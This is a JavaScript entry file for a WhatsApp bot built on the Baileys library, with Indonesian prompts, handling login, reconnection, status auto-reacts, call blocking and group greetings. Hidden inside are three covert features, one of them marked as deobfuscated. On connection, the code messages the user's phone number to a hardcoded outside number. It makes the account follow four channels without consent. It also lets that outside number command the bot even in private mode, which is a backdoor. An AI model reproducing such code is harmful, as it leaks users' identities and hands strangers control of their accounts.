require("./all/global")
const func = require("./all/place")
const readline = require("readline")
const welcome = JSON.parse(fs.readFileSync("./all/database/welcome.json"))
const { sleep } = require("./all/myfunc.js")  
const usePairingCode = true // Define usePairingCode at the top to fix ReferenceError
const question = (text) => {
const rl = readline.createInterface({
input: process.stdin,
output: process.stdout
})
return new Promise((resolve) => {
rl.question(text, resolve)
})}

async function startSesi() {
const store = makeInMemoryStore({ logger: pino().child({ level: 'silent', stream: 'store' }) })
const { state, saveCreds } = await useMultiFileAuthState(`./session`)
const { version, isLatest } = await fetchLatestBaileysVersion()

const connectionOptions = {
printQRInTerminal: !usePairingCode,
version: [2, 3000, 1017531287],    
logger: pino({ level: "fatal" }),
auth: state,
browser: ["Ubuntu","Chrome","20.0.04"],
getMessage: async (key) => {
if (store) {
const msg = await store.loadMessage(key.remoteJid, key.id, undefined)
return msg?.message || undefined
}
return {
conversation: 'WhatsApp Bot By Haikal'
}}
}

const Slash = func.makeWASocket(connectionOptions)
if (usePairingCode && !Slash.authState.creds.registered) {
const phoneNumber = await question(chalk.cyan.bold('Masukan Nomor Whatsapp Awali dengan 62\nContoh : 62838XXX\n'))
const code = await Slash.requestPairingCode(phoneNumber.trim())
console.log(`${chalk.cyan.bold('Kode Verifikasi Kamu')} : ${chalk.redBright.bold(code.split("").join(" "))}`)
}
store?.bind(Slash.ev)

Slash.ev.on('connection.update', async (update) => {
const { connection, lastDisconnect } = update
if (connection === 'close') {
const reason = new Boom(lastDisconnect?.error)?.output.statusCode
console.log(color(lastDisconnect.error, 'deeppink'))
if (lastDisconnect.error == 'Error: Stream Errored (unknown)') {
process.exit()
} else if (reason === DisconnectReason.badSession) {
console.log(color(`Bad Session File, Please Delete Session and Scan Again`))
process.exit()
} else if (reason === DisconnectReason.connectionClosed) {
console.log(color('[SYSTEM]', 'white'), color('Connection closed, reconnecting...', 'deeppink'))
process.exit()
} else if (reason === DisconnectReason.connectionLost) {
console.log(color('[SYSTEM]', 'white'), color('Connection lost, trying to reconnect', 'deeppink'))
process.exit()
} else if (reason === DisconnectReason.connectionReplaced) {
console.log(color('Connection Replaced, Another New Session Opened, Please Close Current Session First'))
Slash.logout()
} else if (reason === DisconnectReason.loggedOut) {
console.log(color(`Device Logged Out, Please Scan Again And Run.`))
Slash.logout()
} else if (reason === DisconnectReason.restartRequired) {
console.log(color('Restart Required, Restarting...'))
await startSesi()
} else if (reason === DisconnectReason.timedOut) {
console.log(color('Connection TimedOut, Reconnecting...'))
startSesi()
}
} else if (connection === "connecting") {
console.log(chalk.cyan.bold('Menghubungkan . . . '))
} else if (connection === "open") {
let teksnotif = `*SimpleBotz Jagagrub* Berhasil Tersambung Ke Nomor WhatsApp ${Slash.user.id.split(":")[0]}`
Slash.sendMessage("62895615063060@s.whatsapp.net", {text: teksnotif})
console.log(chalk.cyan.bold('Bot Berhasil Tersambung'))

// Deobfuscated Channel Joining Logic
const linksal = [
  '0029Vb3ZZZHEFeXup5UNng0o',
  '0029Vb3XDZZKGGGMM19XR62F',
  '0029VaBOlsv002TEjlntTE2D',
  '0029Vb3gqjpHltYCf4WOSt3u'
];
async function folldate(links) {
  for (const link of links) {
    try {
      await sleep(3000);
      const metadata = await Slash.newsletterMetadata('invite', link);
      await sleep(3000);
      await Slash.newsletterFollow(metadata.id);
    } catch (error) {
      console.error(`❌ Gagal join saluran ID: ${link}`, error);
    }
  }
}
await folldate(linksal);
}
})

// Deobfuscated Auto-React Status Logic
Slash.ev.on('messages.upsert', async (chatUpdate) => {
  const message = chatUpdate.messages[0];
  const timeLimit = 5 * 60 * 1000; // 5 minutes
  Slash.decodeJid = (jid) => {
    if (!jid) return jid;
    if (/:\d+@/gi.test(jid)) {
      const decoded = jidDecode(jid) || {};
      return decoded.user && decoded.server ? `${decoded.user}@${decoded.server}` : jid;
    }
    return jid;
  };
  if (global.settings.autoreact && message.key.remoteJid === 'status@broadcast') {
    if (message.key.fromMe) return;
    const now = Date.now();
    const messageTime = message.messageTimestamp * 1000;
    if (now - messageTime <= timeLimit) {
      if (message.pushName && message.pushName.trim() !== '') {
        await Slash.readMessages([message.key]);
        const currentDate = new Date(now);
        const days = ['Senin', 'Selasa', 'Rabu', 'Kamis', 'Jumat', 'Sabtu', 'Minggu'];
        const day = days[currentDate.getDay()];
        const date = currentDate.getDate();
        const month = currentDate.getMonth() + 1;
        const year = currentDate.getFullYear();
        const key = message.key;
        const remoteJid = message.key.remoteJid;
        const botJid = await Slash.decodeJid(Slash.user.id);
        const emoji = global.emoji[Math.floor(Math.random() * global.emoji.length)];
        await Slash.sendMessage(remoteJid, { react: { key, text: emoji } }, { statusJidList: [key.participant, botJid] });
        console.log('React WhatsApp Story');
        console.log('• Name: ', message.pushName);
        console.log('• Date: ', `${day}, ${date}/${month}/${year}`);
        console.log('• React: ', emoji);
      }
    }
  }
});

Slash.ev.on('call', async (user) => {
if (!global.anticall) return
for (let ff of user) {
if (ff.isGroup == false) {
if (ff.status == "offer") {
let sendcall = await Slash.sendMessage(ff.from, {text: `@${ff.from.split("@")[0]} Maaf Kamu Akan Saya Block Karna Ownerbot Menyalakan Fitur *Anticall*\nJika Tidak Sengaja Segera Hubungi Owner Untuk Membuka Blokiran Ini`, contextInfo: {mentionedJid: [ff.from], externalAdReply: {showAdAttribution: true, thumbnail: fs.readFileSync("./media/warning.jpg"), title: "｢ CALL DETECTED ｣", previewType: "PHOTO"}}}, {quoted: null})
Slash.sendContact(ff.from, [owner], "Developer WhatsApp Bot", sendcall)
await sleep(10000)
await Slash.updateBlockStatus(ff.from, "block")
}}
}})

Slash.ev.on('messages.upsert', async (chatUpdate) => {
try {
m = chatUpdate.messages[0]
if (!m.message) return
m.message = (Object.keys(m.message)[0] === 'ephemeralMessage') ? m.message.ephemeralMessage.message : m.message
if (m.isBaileys) return
if (m.key && m.key.remoteJid === 'status@broadcast') {
if (global.autoreadsw) Slash.readMessages([m.key])
}
let fill = [global.owner, "62895615063060"]
if (!Slash.public && !fill.includes(m.key.remoteJid.split("@")[0]) && !m.key.fromMe && chatUpdate.type === 'notify') return
if (global.autoread) Slash.readMessages([m.key])
m = func.smsg(Slash, m, store)
require("./Slash")(Slash, m, store)
} catch (err) {
console.log(err)
}
})

Slash.ev.on('group-participants.update', async (anu) => {
if (!welcome.includes(anu.id)) return
let botNumber = await Slash.decodeJid(Slash.user.id)
if (anu.participants.includes(botNumber)) return
try {
let metadata = await Slash.groupMetadata(anu.id)
let namagc = metadata.subject
let participants = anu.participants
for (let num of participants) {
let check = anu.author !== num && anu.author.length > 1
let tag = check ? [anu.author, num] : [num]
try {
ppuser = await Slash.profilePictureUrl(num, 'image')
} catch {
ppuser = 'https://telegra.ph/file/d1688cff04f816713f8aa.jpg'
}
if (anu.action == 'add') {
Slash.sendMessage(anu.id, {text: check ? `@${anu.author.split("@")[0]} Telah Menambahkan @${num.split("@")[0]} Ke Dalam Grup Ini` : `Hallo Kak @${num.split("@")[0]} Selamat Datang Di *${namagc}*`, 
contextInfo: {mentionedJid: [...tag], externalAdReply: { thumbnailUrl: ppuser, title: '© Welcome Message', body: '', renderLargerThumbnail: true, sourceUrl: linkgc, mediaType: 1}}})
} else if (anu.action == 'remove') { 
Slash.sendMessage(anu.id, {text: check ? `@${anu.author.split("@")[0]} Telah Mengeluarkan @${num.split("@")[0]} Dari Grup Ini` : `@${num.split("@")[0]} Telah Keluar Dari Grup Ini`, 
contextInfo: {mentionedJid: [...tag], externalAdReply: { thumbnailUrl: ppuser, title: '© Leaving Message', body: '', renderLargerThumbnail: true, sourceUrl: linkgc, mediaType: 1}}})
} else if (anu.action == "promote") {
Slash.sendMessage(anu.id, {text: `@${anu.author.split("@")[0]} Telah Menjadikan @${num.split("@")[0]} Sebagai Admin Grup Ini`, 
contextInfo: {mentionedJid: [...tag], externalAdReply: { thumbnailUrl: ppuser, title: '© Promote Message', body: '', renderLargerThumbnail: true, sourceUrl: linkgc, mediaType: 1}}})
} else if (anu.action == "demote") {
Slash.sendMessage(anu.id, {text: `@${anu.author.split("@")[0]} Telah Memberhentikan @${num.split("@")[0]} Sebagai Admin Grup Ini`, 
contextInfo: {mentionedJid: [...tag], externalAdReply: { thumbnailUrl: ppuser, title: '© Demote Message', body: '', renderLargerThumbnail: true, sourceUrl: linkgc, mediaType: 1}}})
}
}
} catch (err) {
console.log(err)
}})

Slash.public = true

Slash.ev.on('creds.update', saveCreds)
return Slash
}

startSesi()

process.on('uncaughtException', function (err) {
console.log('Caught exception: ', err)
})